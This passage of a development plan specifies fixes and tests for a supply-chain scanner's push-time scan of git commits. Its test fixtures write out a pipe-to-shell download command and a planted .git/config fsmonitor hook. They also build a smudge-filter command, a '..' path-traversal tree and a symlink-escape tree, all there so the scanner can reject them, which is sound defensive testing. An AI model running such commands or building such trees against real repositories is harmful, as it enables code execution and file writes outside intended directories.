(c) Immediately after the line that reads exactly `check_patterns`, the call under
`# ---- pattern rules`, insert:

```bash

# The pattern rules read grep --null output. Not every grep has it: BusyBox's refuses it and exits
# 2, which the loop below discards with grep's other errors, so every pattern rule would go silent
# and the scan would read as clean. Proven once here, and a grep without it fails the scan.
printf 'x\n' | grep -H --null x >/dev/null 2>&1 \
  || report "this grep has no --null, which the pattern rules read, so none of them can run. Use GNU grep, BSD grep or ugrep"
```

(d) In the pattern rules loop, replace

```bash
    # -H forces the filename prefix even when only one file is passed, so the parse below is uniform.
    while IFS= read -r hit; do
        [ -n "$hit" ] || continue
        f="${hit%%:*}"; rest="${hit#*:}"
        line="${rest%%:*}"; text="${rest#*:}"
```

with

```bash
    # -H forces the filename prefix even when only one file is passed, so the parse below is uniform.
    # --null ends the name with a NUL, so a name holding colons cannot move the split: split at the
    # first colon, docs/x:y:supply-chain-scan: allow z.md read its own payload line as a suppression.
    # Names go to grep as ./path, so one named - is a file and not grep's stdin.
    while IFS= read -r -d '' f && IFS= read -r rest; do
        f="${f#./}"
        line="${rest%%:*}"; text="${rest#*:}"
```

and replace that loop's closing line
`    done < <(tr '\n' '\0' < "$list" | xargs -0 grep "$gflags" -- "$pat" 2>/dev/null)` with the two
lines:

```bash
    # -a, since every file here already passed the walk's text test: GNU grep 3.4 and older print
    # "Binary file matches" to stdout with no NUL, which would join the next hit's name and lose it.
    done < <(sed 's|^|./|' "$list" | tr '\n' '\0' | xargs -0 grep -a "$gflags" --null -- "$pat" 2>/dev/null)
```

The `-a` has no test here: the failure needs GNU grep 3.4 or older, which neither the maintainer's
machine nor CI runs.

Lint: run the shellcheck command from the global constraints.

In `CHANGELOG.md`, add as the first bullet under `## Unreleased`:

```markdown
- The supply chain scan reads a file named `-` or starting with a dash as a file, where `-` hid
  every file listed after it, and a file name holding colons can no longer forge a suppression of
  its own finding. A grep with no `--null`, such as BusyBox's, fails the scan instead of silencing
  every pattern rule.
```

- [x] **Step 4: Run it and watch it pass**

Run: `tests/test-supply-chain.sh`
Expected: PASS, a final line reading `N passed, 0 failed`, including the seven new cases and
`every rule is exercised by a sample`.

Then run `tests/validate-citations.sh` and repair what it reports, per the global constraints.

- [x] **Step 5: Run the suite at the unit boundary, then hand over**

Run: `tests/run-tests.sh`
Expected: `All test files passed`, or reds this task did not cause, each named and matched against
the start record. This is the one suite run the task schedules.

```bash
git add tests/supply-chain-scan.sh tests/test-supply-chain.sh CHANGELOG.md
git status --porcelain
```

Stage exactly those paths and stop. **Do not commit.** The coordinator commits after both review
passes, with `git commit -m "fix(scan): a file name can neither hide files from the scan nor forge a suppression"`.
Paste the `git status --porcelain` output into your report; if it lists anything this task did not
touch, say so and leave it unstaged.

---

### Task 1d: The executable scope reads the index's mode, not only the disk's bit

**Story:** none; task 2's fourth quality review. The scanner decided a file was executable from its
bit on disk alone. On a noexec mount, or a copy written without modes, every file read as not
executable, so the rules scoped to executables never ran over a file the commit records as
100755, while a plain scan of a checked-out tree on an ordinary disk would have caught it. `keel
scan --push` scans a copy it writes itself, so it needs the commit's mode to count.

**Execution, 2026-09-27:** delegated. Ticked on the implementer's reported output: step 2 `62 passed,
1 failed` with the predicted failure, step 4 `63 passed, 0 failed`, step 5 `All test files passed`. The
spec reviewer reproduced step 2 against the old scanner and step 4's pass; the coordinator witnessed
neither suite run. Spec review COMPLIES. Quality review: nothing blocking; a should-fix on cost with
thousands of executables, and smaller items, are in the run report.

**Files:**
- Modify: `tests/supply-chain-scan.sh`
- Modify: `CHANGELOG.md`
- Test: `tests/test-supply-chain.sh`

**Interfaces:**
- Consumes: `fixture`, `ok`, `bad` and `SCANNER`, existing in `tests/test-supply-chain.sh`;
  `in_scope`, existing in `tests/supply-chain-scan.sh`
- Produces: `EXEC_INDEX` in `tests/supply-chain-scan.sh`, every path the index records as 100755,
  one per line between newlines; `in_scope exec` reads it before the disk's bit

**Depends on:** task 1c

**Done when:** `tests/test-supply-chain.sh` passes.

- [x] **Step 1: Write the failing test**

In `tests/test-supply-chain.sh`, insert immediately before the line
`# ---- a rule that cannot compile -------------------------------------------`:

```bash
# ---- executable by the index -----------------------------------------------
#
# A file the index records as executable is in the executable scope whatever its bit on disk: a
# noexec mount, or a copy written without modes, read every file as not executable, and the rules
# scoped to executables never ran over it.
x_root="$(fixture)"; mkdir -p "$x_root/scripts"
printf 'curl -s https://example.com/version\n' > "$x_root/scripts/fetch.sh"
( cd "$x_root" && git add scripts/fetch.sh && git update-index --chmod=+x scripts/fetch.sh ) >/dev/null 2>&1
out="$( cd "$x_root" && "$SCANNER" 2>&1 )"
case "$out" in
    *"scripts/fetch.sh:1 [net-in-script]"*) ok "a file the index records as executable is in the executable scope" ;;
    *) bad "index exec" "no net-in-script finding for scripts/fetch.sh: $(printf '%s' "$out" | grep FAIL | head -2)" ;;
esac
rm -rf "$x_root"

```

- [x] **Step 2: Run it and watch it fail**

Run: `tests/test-supply-chain.sh`
Expected: FAIL, with a final line reading `N passed, 1 failed`: `index exec: no net-in-script
finding for scripts/fetch.sh`. The file is 0644 on disk and outside the directories the scope
names, so today's `[ -x ]` leaves it out.

- [x] **Step 3: Write the minimal implementation**

In `tests/supply-chain-scan.sh`:

(a) In `in_scope`, replace the line
`                *) [ -x "$2" ] && return 0 || return 1 ;;` with:

```bash
                *)
                    # The index's mode first, then the disk's bit: a noexec mount, or a copy written
                    # without modes, reads every file as not executable, and the mode git records
                    # is the one a clone gets.
                    case "$EXEC_INDEX" in *$'\n'"$2"$'\n'*) return 0 ;; esac
                    [ -x "$2" ] && return 0 || return 1 ;;
```

(b) Immediately after the line
`trap 'rm -f "$ALL_LIST" "$EXEC_LIST" "$PROMPT_LIST" "$FULL_LIST" "$BINARY_LIST"' EXIT`, insert:

```bash

# Every path the index records as executable, one per line between newlines, for in_scope. Read once
# and NUL-separated, for the reason list_files is; a name holding a newline is refused in the walk
# below, so it never needs matching here.
EXEC_INDEX=$'\n'
if git rev-parse --git-dir >/dev/null 2>&1; then
    while IFS= read -r -d '' e; do
        if [ "${e%% *}" = 100755 ]; then EXEC_INDEX="$EXEC_INDEX${e#*$'\t'}"$'\n'; fi
    done < <(git ls-files -s -z)
fi
```

Lint: run the shellcheck command from the global constraints.

In `CHANGELOG.md`, add as the first bullet under `## Unreleased`:

```markdown
- The supply chain scan counts a file the index records as executable in its executable scope,
  whatever its bit on disk, so a noexec mount no longer hides one from the rules scoped to
  executables.
```

- [x] **Step 4: Run it and watch it pass**

Run: `tests/test-supply-chain.sh`
Expected: PASS, a final line reading `N passed, 0 failed`, including `a file the index records as
executable is in the executable scope` and `every rule is exercised by a sample`.

Then run `tests/validate-citations.sh` and repair what it reports, per the global constraints.

- [x] **Step 5: Run the suite at the unit boundary, then hand over**

Run: `tests/run-tests.sh`
Expected: `All test files passed`, or reds this task did not cause, each named and matched against
the start record. This is the one suite run the task schedules.

```bash
git add tests/supply-chain-scan.sh tests/test-supply-chain.sh CHANGELOG.md
git status --porcelain
```

Stage exactly those paths and stop. **Do not commit.** The coordinator commits after both review
passes, with `git commit -m "fix(scan): the executable scope reads the index's mode, not only the disk's bit"`.
Paste the `git status --porcelain` output into your report; if it lists anything this task did not
touch, say so and leave it unstaged.

---

### Task 2: `keel scan --push` scans a commit, not the working tree

**Story:** none; the idea record's recommendation, the "Tip + key filenames" and "Changed keys"
decisions.

**Revised 2026-09-27 after the first attempt was rejected.** Its quality review found four blocking
defects in the code this task then specified, each reproduced: a tree holding `.git/config` became
the scan repository's configuration, and its `core.fsmonitor` ran; two paths the filesystem holds
as one file (a case pair, or a file beside a directory) hid a payload, since a failed rewrite was
never checked; a `git log` that stopped partway passed as a clean history; and the scanner skipped
names git quotes, now task 1b. It also found that a merge's own additions and a changed key were
missed, and that the tip was compared through a case-folding disk. The attempt was discarded
unstaged; everything below is the corrected task, and every case added since carries a test.

**Revised again 2026-09-27 after the second attempt was rejected.** Its quality review confirmed the
first review's five fixes and found three new blocking defects, each reproduced: a `..` path, which
`git mktree` builds, made the rewrite step write a file anywhere this user can write, and the scan
passed; two names the disk holds as one file, with the same content, reached the rules only by the
name the disk kept, so `A.key` beside `a.KEY` passed; and a rewritten file lost its executable bit
on disk. It also found `git archive` running a smudge command the pushed `.gitattributes` chose
(confirmed by the coordinator), and four history gaps: a key's type change, a tip holding the key
path as a directory, `log.showRoot=false`, and replace refs. So the task no longer uses `git
archive` or `git add`: the scan repository reads the pushed repository's objects in place, its
index is the commit's tree, `checkout-index` writes the files with the commit's `.gitattributes`
out of the index and the user's configuration out of reach, and the history walk is plumbing. The
second attempt was discarded unstaged. The coordinator ran this version's code against each
reproduced case in a scratch copy before it went into the plan.

**Revised a third time 2026-09-27 after the third attempt was rejected.** Its quality review
confirmed every earlier fix and found two new blocking defects, each reproduced on this machine's
case-folding disk: a tree holding `X/y` beside a symlink `x` let `checkout-index` replace the
directory with the symlink, and the rewrite step then wrote and `chmod`ed through it, outside the
copy, before the second check refused; and `Run.sh` at 100755 beside `run.sh` at 100644, the same
blob, left one file on disk with neither name executable, so the rules scoped to executables never
ran. So `checkout-index` now writes no symlink (`core.symlinks false`), and where the filesystem
keeps an executable bit, one that differs from the commit's mode is a mismatch. It also matches
`.gitattributes` in any case, and keeps a failed redirect's error out of the output. The third
attempt was discarded unstaged, and the coordinator smoke-tested this version against both new
cases and every earlier one first.

**Revised a fourth time 2026-09-27 after the fourth attempt was rejected.** Its quality review
confirmed every earlier fix, rerunning most, and found one new blocking defect, reproduced three
ways: the scanner reads `.keel/scan-allow` by name, so a commit holding `.keel/SCAN-ALLOW`, a
Unicode name APFS folds to it, or a symlink by that name handed the scan an allow list the commit
does not hold as a file. An allow list is now honoured only where the commit holds that exact path
as a file. The same review found that the executable probe went blind on a noexec mount, now task
1d, which takes the mode from the index and lets this task drop the probe, its two checks and the
`chmod`; that a SHA-256 repository was refused, since the scan repository was always SHA-1; and
that a history path with a `.` component was looked up relative to the working directory. Both
are fixed and tested. The fourth attempt was discarded unstaged, and the coordinator smoke-tested
this version against every case so far first.

**Execution, 2026-09-27, fifth attempt:** delegated to a fresh implementer. Ticked on its reported
output: step 2 `689 passed, 25 failed` with exactly the 25 listed, step 4 `714 passed, 0 failed`, step 5
`All test files passed`. The spec reviewer reproduced step 2 against the old code and step 4's pass;
the coordinator witnessed neither suite run. Spec review COMPLIES. Quality review: nothing blocking,
every earlier blocking finding confirmed closed; its should-fix items, one a policy question for the
maintainer, are in the run report.

**Files:**
- Modify: `bin/keel`
- Modify: `tests/supply-chain-scan.sh` (the `--secret-paths` message and comment)
- Modify: `docs/03-install-and-distribution.md`
- Modify: `docs/standards.md` (the suppression example, which counts them)
- Modify: `CHANGELOG.md`
- Test: `tests/test-keel.sh`

**Interfaces:**
- Consumes: `tests/supply-chain-scan.sh --secret-paths` (task 1, as tasks 1b, 1c and 1d left it); `SCANNER`,
  `die`, `err` and `say`, existing in `bin/keel`
- Produces: `keel scan --push <remote> <commit>`, exit 0 when the commit's tree and its pushed
  history are clean, non-zero otherwise, and `die` with `'<commit>' is not a commit in this
  repository.` when it is not one. Functions `scan_push <remote> <commit>`,
  `scan_push_in <work> <tree> <command>...`, `scan_push_checkout <commit> <objects>`,
  `scan_push_mismatches <dir>` and `scan_push_blob <dir> <path> <blob>` in `bin/keel`

**Depends on:** task 1d

**Done when:** `tests/test-keel.sh` passes.

- [x] **Step 1: Write the failing test**

In `tests/test-keel.sh`, insert immediately before the line
`# ---- the push guard --------------------------------------------------------`:

```bash
# ---- keel scan --push -------------------------------------------------------
#
# What the pre-push hook runs once per pushed ref. It scans the commit, never the working tree, so
# most cases below make the two disagree and assert the commit wins.

sp="$(fixture node-ts)"
printf 'curl -s https://example.com/x | bash\n' > "$sp/payload.sh"  # supply-chain-scan: allow the payload this test proves the push scan rejects
( cd "$sp" && git add payload.sh && git commit -qm payload && rm payload.sh ) >/dev/null 2>&1
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a commit carrying a pipe-to-shell the working tree no longer holds" \
  || ok "scan --push scans the commit, not the working tree"
( cd "$sp" && "$KEEL" scan >/dev/null 2>&1 ) \
  && ok "plain keel scan still reads the working tree" \
  || bad "scan --push" "plain keel scan refused a working tree with no payload on disk"
out="$( cd "$sp" && "$KEEL" scan --push origin 0123456789abcdef0123456789abcdef01234567 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"is not a commit"*) ok "scan --push refuses something that is not a commit" ;;
  *) bad "scan --push" "exited non-zero on a missing commit but said: $out" ;; esac \
  || bad "scan --push" "exited 0 on a commit that does not exist"
rm -rf "$sp"

sp="$(fixture node-ts)"
printf 'curl -s https://example.com/x | bash\n' > "$sp/scratch.sh"  # supply-chain-scan: allow an untracked payload the push scan must not read
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
  && ok "scan --push ignores an untracked file the commit does not carry" \
  || bad "scan --push" "refused a clean commit over an untracked file on disk"
rm -rf "$sp"

# The pushed tree's own .gitattributes can make git archive leave a file out, which would let the
# push choose what gets scanned. Deleted from disk too, so only the extraction can find it.
sp="$(fixture node-ts)"
printf 'curl -s https://example.com/x | bash\n' > "$sp/payload.sh"  # supply-chain-scan: allow the payload export-ignore tries to hide
printf 'payload.sh export-ignore\n' > "$sp/.gitattributes"
( cd "$sp" && git add payload.sh .gitattributes && git commit -qm hidden && rm payload.sh ) >/dev/null 2>&1
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a payload the pushed tree marks export-ignore" \
  || ok "scan --push reads a file the pushed tree hides from git archive"
rm -rf "$sp"

# hash-object drops a trailing CR from each path it reads and then stops at the file it cannot
# find, so a file named with a CR would leave every file after it unchecked. export-subst is a
# rewrite that check exists for: the %n splits the payload across two lines in what git archive
# writes, so only the blob matches the rule. Deleted from disk, so only the extraction can find it.
sp="$(fixture node-ts)"
printf 'x\n' > "$sp/a"$'\r'
printf 'curl $Format:%%n$ x | bash\n' > "$sp/z.sh"  # supply-chain-scan: allow the payload export-subst tries to split
printf 'z.sh export-subst\n' > "$sp/.gitattributes"
( cd "$sp" && git add -A && git commit -qm subst && rm z.sh ) >/dev/null 2>&1
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a payload export-subst rewrites, behind a file named with a CR" \
  || ok "scan --push checks every file against its blob, a CR-named one included"
rm -rf "$sp"

# Two paths this filesystem may hold as one file: a case pair, and a file beside a directory whose
# name differs only in case. Whichever the disk keeps, the other cannot be scanned, so the scan
# refuses. Built with plumbing, since no working tree on a case-folding disk can hold both. On a
# case-sensitive filesystem there is no collision and the payload is simply found.
sp="$(fixture node-ts)"
pay="$( cd "$sp" && printf 'curl -s https://example.com/x | bash\n' | git hash-object -w --stdin )"  # supply-chain-scan: allow the payload a path collision tries to hide
okb="$( cd "$sp" && printf 'echo ok\n' | git hash-object -w --stdin )"
c="$( cd "$sp" && git commit-tree -m case "$(printf '100644 blob %s\tPayload.sh\n100644 blob %s\tpayload.sh\n' "$okb" "$pay" | git mktree)" )"
( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a payload beside a path that differs from it only in case" \
  || ok "scan --push refuses a payload a case collision would hide"
sub="$( cd "$sp" && printf '100644 blob %s\tx\n' "$okb" | git mktree )"
c="$( cd "$sp" && git commit-tree -m dir "$(printf '100644 blob %s\tA.sh\n040000 tree %s\ta.sh\n' "$pay" "$sub" | git mktree)" )"
( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a payload beside a directory that differs from it only in case" \
  || ok "scan --push refuses a payload a file-and-directory collision would hide"
rm -rf "$sp"

# git refuses to check out a path with a .git component, in any case, because it would configure the
# repository it lands in, and git mktree builds one. The scan refuses such a commit before writing
# anything, so a planted .git/config never becomes the scan's own configuration, whose
# core.fsmonitor would run. The no-command assertion passes before the change too, since the old
# scan read the working tree; it fails if the extraction ever reads the planted file.
sp="$(fixture node-ts)"
blob="$( cd "$sp" && printf '[core]\n\tfsmonitor = "touch %s/pwned; false"\n' "$sp" | git hash-object -w --stdin )"
sub="$( cd "$sp" && printf '100644 blob %s\tconfig\n' "$blob" | git mktree )"
c="$( cd "$sp" && git commit-tree -m planted "$(printf '040000 tree %s\t.git\n' "$sub" | git mktree)" )"
out="$( cd "$sp" && "$KEEL" scan --push origin "$c" 2>&1 )"; rc=$?
[ ! -e "$sp/pwned" ] && ok "scan --push never runs configuration a pushed tree plants" \
  || bad "scan --push" "a planted .git/config ran a command"
[ "$rc" -ne 0 ] && case "$out" in *"git refuses to check out"*) ok "scan --push refuses a commit holding a .git path" ;;
  *) bad "scan --push" "refused a planted .git path but said: $out" ;; esac \
  || bad "scan --push" "allowed a commit holding .git/config"
c="$( cd "$sp" && git commit-tree -m planted "$(printf '040000 tree %s\t.GIT\n' "$sub" | git mktree)" )"
( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a commit holding .GIT/config" \
  || ok "scan --push refuses a .git path in any case"
rm -rf "$sp"

# A key added and then deleted inside the push reaches the remote in history.
sp="$(fixture node-ts)"
printf 'x\n' > "$sp/deploy.key"
( cd "$sp" && git add deploy.key && git commit -qm key && git rm -q deploy.key && git commit -qm "drop key" ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"deploy.key"*) ok "scan --push refuses a key file a pushed commit added and a later one deleted" ;;
  *) bad "scan --push" "refused, but did not name deploy.key: $out" ;; esac \
  || bad "scan --push" "allowed a push whose history carries deploy.key"
# Once the remote holds the commit that added it, the key is not this push's to carry.
( cd "$sp" && git update-ref refs/remotes/origin/main HEAD~1 )
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
  && ok "scan --push leaves history the remote already holds alone" \
  || bad "scan --push" "refused over a key the remote-tracking branch already holds"
rm -rf "$sp"

# A key the remote already holds, changed in the push and then deleted, still sends the new key.
sp="$(fixture node-ts)"
printf 'old\n' > "$sp/deploy.key"
( cd "$sp" && git add deploy.key && git commit -qm key && git update-ref refs/remotes/origin/main HEAD \
  && printf 'new\n' > deploy.key && git commit -qam "rotate key" && git rm -q deploy.key && git commit -qm "drop key" ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"deploy.key"*) ok "scan --push refuses a key file a pushed commit changed and a later one deleted" ;;
  *) bad "scan --push" "refused, but did not name deploy.key: $out" ;; esac \
  || bad "scan --push" "allowed a push whose history carries a changed deploy.key"
rm -rf "$sp"

# A key a merge commit itself adds, in its resolution, shows in no plain git log of the history.
sp="$(fixture node-ts)"
( cd "$sp" && git switch -q -c side && printf 's\n' > s.txt && git add s.txt && git commit -qm side \
  && git switch -q main && printf 'm\n' > m.txt && git add m.txt && git commit -qm m \
  && git merge -q --no-ff --no-commit side && printf 'k\n' > prod.key && git add prod.key && git commit -qm merge \
  && git rm -q prod.key && git commit -qm "drop key" ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"prod.key"*) ok "scan --push refuses a key file a merge commit added" ;;
  *) bad "scan --push" "refused, but did not name prod.key: $out" ;; esac \
  || bad "scan --push" "allowed a push whose merge commit added prod.key"
rm -rf "$sp"

# The tip's paths are looked up exactly, not through the filesystem: on a case-folding disk TEST.key
# would read as present because the tip holds test.key. The two commits are built with plumbing,
# since neither a working tree nor an index on such a disk can hold both names.
sp="$(fixture node-ts)"
mkdir -p "$sp/.keel"; printf 'x\n' > "$sp/test.key"
printf 'test.key an expired fixture, no live credential\n' > "$sp/.keel/scan-allow"
( cd "$sp" && git add test.key .keel/scan-allow && git commit -qm fixture && git update-ref refs/remotes/origin/main HEAD ) >/dev/null 2>&1
live="$( cd "$sp" && printf 'live\n' | git hash-object -w --stdin )"
c1="$( cd "$sp" && git commit-tree -p HEAD -m "add TEST.key" "$( { git ls-tree HEAD; printf '100644 blob %s\tTEST.key\n' "$live"; } | git mktree )" )"
c2="$( cd "$sp" && git commit-tree -p "$c1" -m "drop TEST.key" 'HEAD^{tree}' )"
out="$( cd "$sp" && "$KEEL" scan --push origin "$c2" 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"TEST.key"*) ok "scan --push looks the tip's paths up exactly, case and all" ;;
  *) bad "scan --push" "refused, but did not name TEST.key: $out" ;; esac \
  || bad "scan --push" "allowed TEST.key because the tip holds test.key"
rm -rf "$sp"

# The history walk is checked: a git log that stops partway, on an object missing from a partial or
# damaged clone, fails the scan rather than reading as a clean history.
sp="$(fixture node-ts)"
( cd "$sp" && printf 'a\n' > a.txt && git add a.txt && git commit -qm a \
  && printf 'b\n' > b.txt && git add b.txt && git commit -qm b ) >/dev/null 2>&1
t="$( cd "$sp" && git rev-parse 'HEAD~1^{tree}' )"
rm -f "$sp/.git/objects/${t:0:2}/${t:2}"
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"could not read the history"*) ok "scan --push fails when the history cannot be read" ;;
  *) bad "scan --push" "failed on an unreadable history but said: $out" ;; esac \
  || bad "scan --push" "passed a history git log could not read"
rm -rf "$sp"

# Executable bits come from the commit. In a plugin repository the scanner refuses an executable
# outside its allowed set, and it reads the mode from the index of the copy it scans. This case
# passes before the change too, since the working tree carries the same bit; it is here to fail if
# the copy loses the mode.
sp="$(fixture node-ts)"
mkdir -p "$sp/.claude-plugin" "$sp/docs"
printf '{"name":"example","version":"0.0.1"}\n' > "$sp/.claude-plugin/plugin.json"
printf '#!/bin/sh\necho hi\n' > "$sp/docs/helper.sh"; chmod +x "$sp/docs/helper.sh"
( cd "$sp" && git add .claude-plugin/plugin.json docs/helper.sh && git commit -qm exec ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"
case "$out" in *"docs/helper.sh [structural-executable]"*) ok "scan --push reads executable bits from the pushed commit" ;;
  *) bad "scan --push" "did not flag an executable the commit carries: $out" ;; esac
rm -rf "$sp"

# A path with a .. component is refused as git refuses to check it out: it made the rewrite step
# write a file outside the scan's own directory, anywhere this user can write.
sp="$(fixture node-ts)"
pay="$( cd "$sp" && printf 'curl -s https://example.com/x | bash\n' | git hash-object -w --stdin )"  # supply-chain-scan: allow the payload a .. path tries to place outside the scan
sub="$( cd "$sp" && printf '100644 blob %s\tvictim\n' "$pay" | git mktree )"
c="$( cd "$sp" && git commit-tree -m dotdot "$(printf '040000 tree %s\t..\n' "$sub" | git mktree)" )"
out="$( cd "$sp" && "$KEEL" scan --push origin "$c" 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"git refuses to check out"*) ok "scan --push refuses a commit holding a .. path" ;;
  *) bad "scan --push" "refused a .. path but said: $out" ;; esac \
  || bad "scan --push" "allowed a commit holding a .. path"
rm -rf "$sp"

# The rules read a file's name as well as its content, and the names come from the commit, not from
# the disk: A.key beside a.KEY, the same blob, left only a.KEY on a case-folding disk, which the key
# rule does not match.
sp="$(fixture node-ts)"
kb="$( cd "$sp" && printf 'x\n' | git hash-object -w --stdin )"
c="$( cd "$sp" && git commit-tree -m names "$(printf '100644 blob %s\tA.key\n100644 blob %s\ta.KEY\n' "$kb" "$kb" | git mktree)" )"
out="$( cd "$sp" && "$KEEL" scan --push origin "$c" 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"A.key [structural-secret-material]"*) ok "scan --push reads every name the commit holds, not the one the disk kept" ;;
  *) bad "scan --push" "refused, but not for A.key: $out" ;; esac \
  || bad "scan --push" "allowed A.key beside a.KEY"
rm -rf "$sp"

# A key path that changes type in the push, a symlink on the remote becoming a real key file, is a
# change git reports as T, not A or M, and deleting it later still sends the key.
sp="$(fixture node-ts)"
( cd "$sp" && ln -s elsewhere deploy.key && git add deploy.key && git commit -qm link && git update-ref refs/remotes/origin/main HEAD \
  && rm deploy.key && printf 'real\n' > deploy.key && git add deploy.key && git commit -qm "real key" \
  && git rm -q deploy.key && git commit -qm "drop key" ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"deploy.key"*) ok "scan --push refuses a key file a pushed commit changed from a symlink" ;;
  *) bad "scan --push" "refused, but did not name deploy.key: $out" ;; esac \
  || bad "scan --push" "allowed a push whose history turns a symlink into deploy.key"
rm -rf "$sp"

# A tip holding a key path as a directory does not hold the key: deploy.key/notes.txt is not a key
# file, and the key a pushed commit added under that name is still in history.
sp="$(fixture node-ts)"
( cd "$sp" && printf 'x\n' > deploy.key && git add deploy.key && git commit -qm key && git rm -q deploy.key \
  && mkdir deploy.key && printf 'n\n' > deploy.key/notes.txt && git add deploy.key/notes.txt && git commit -qm dir ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"deploy.key [structural-secret-material]"*) ok "scan --push counts only a file in the tip as holding a key path" ;;
  *) bad "scan --push" "refused, but not for deploy.key: $out" ;; esac \
  || bad "scan --push" "allowed a key the tip replaced with a directory of the same name"
rm -rf "$sp"

# The history walk reads no porcelain configuration: with log.showRoot false, git log shows nothing
# a root commit added, so a key added in the first commit of a new history and deleted later passed.
sp="$(fixture node-ts)"
( cd "$sp" && git config log.showRoot false && git checkout -q --orphan fresh && git rm -rqf . \
  && printf 'x\n' > root.key && git add root.key && git commit -qm root \
  && git rm -q root.key && printf 'a\n' > a.txt && git add a.txt && git commit -qm "drop key" ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin fresh 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"root.key"*) ok "scan --push reads a root commit's additions whatever log.showRoot says" ;;
  *) bad "scan --push" "refused, but did not name root.key: $out" ;; esac \
  || bad "scan --push" "allowed a key a root commit added, with log.showRoot false"
rm -rf "$sp"

# Replace refs change what git reads and not what push sends: a scan of a commit replaced by a clean
# one read the clean one, while a push delivers the payload.
sp="$(fixture node-ts)"
printf 'curl -s https://example.com/x | bash\n' > "$sp/payload.sh"  # supply-chain-scan: allow the payload a replace ref tries to hide
( cd "$sp" && git add payload.sh && git commit -qm bad ) >/dev/null 2>&1
bad_c="$( cd "$sp" && git rev-parse HEAD )"
( cd "$sp" && git rm -q payload.sh && git commit -qm good && git replace "$bad_c" HEAD ) >/dev/null 2>&1
( cd "$sp" && "$KEEL" scan --push origin "$bad_c" >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a payload a replace ref stands in front of" \
  || ok "scan --push reads the commit being pushed, not a replacement"
rm -rf "$sp"

# The files are written with no filter the pushed tree names: git archive ran a smudge command a
# pushed .gitattributes selected. This case passes before the change too, since the old scan read
# the working tree; it fails if the extraction ever runs one.
sp="$(fixture node-ts)"
printf 'a\n' > "$sp/a.txt"; printf 'a.txt filter=demo\n' > "$sp/.gitattributes"
( cd "$sp" && git add a.txt .gitattributes && git commit -qm attr && git config filter.demo.smudge "touch $sp/smudged; cat" ) >/dev/null 2>&1
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 )
[ ! -e "$sp/smudged" ] && ok "scan --push runs no filter the pushed tree names" \
  || bad "scan --push" "a filter the pushed .gitattributes named ran during the scan"
rm -rf "$sp"

# No symlink is ever written: on a case-folding disk a symlink x beside a directory X/ replaced
# the directory, and the files under X/ were then written through it, outside the scan. The
# outside directory is this fixture's own. It stays untouched before the change too, since the old
# scan read the working tree; the refusal is what fails first.
sp="$(fixture node-ts)"; mkdir -p "$sp-out"
pay="$( cd "$sp" && printf 'curl -s https://example.com/x | bash\n' | git hash-object -w --stdin )"  # supply-chain-scan: allow the payload a symlink tries to write outside the scan
ysub="$( cd "$sp" && printf '100755 blob %s\ty\n' "$pay" | git mktree )"
lnk="$( cd "$sp" && printf '%s' "$sp-out" | git hash-object -w --stdin )"
c="$( cd "$sp" && git commit-tree -m link "$(printf '040000 tree %s\tX\n120000 blob %s\tx\n' "$ysub" "$lnk" | git mktree)" )"
( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a directory beside a symlink of the same name folded" \
  || ok "scan --push refuses a directory beside a symlink of the same name folded"
[ -z "$(ls -A "$sp-out")" ] && ok "scan --push writes nothing outside its own directory" \
  || bad "scan --push" "the scan wrote outside its directory: $(ls -A "$sp-out")"
rm -rf "$sp" "$sp-out"

# Where the filesystem keeps an executable bit, the disk must match the commit's mode: Run.sh at
# 100755 beside run.sh at 100644, the same blob, left one file on a case-folding disk that neither
# name found executable, so the rules scoped to executables never ran over it.
sp="$(fixture node-ts)"
net="$( cd "$sp" && printf 'curl -s https://example.com/version\n' | git hash-object -w --stdin )"  # supply-chain-scan: allow a network call the push scan must see in an executable
c="$( cd "$sp" && git commit-tree -m modes "$(printf '100755 blob %s\tRun.sh\n100644 blob %s\trun.sh\n' "$net" "$net" | git mktree)" )"
( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed an executable beside a same-content file that differs only in case and mode" \
  || ok "scan --push refuses a case pair that differs in mode"
rm -rf "$sp"

# .keel/scan-allow is honoured only where the commit holds that exact path as a file. A case-folding
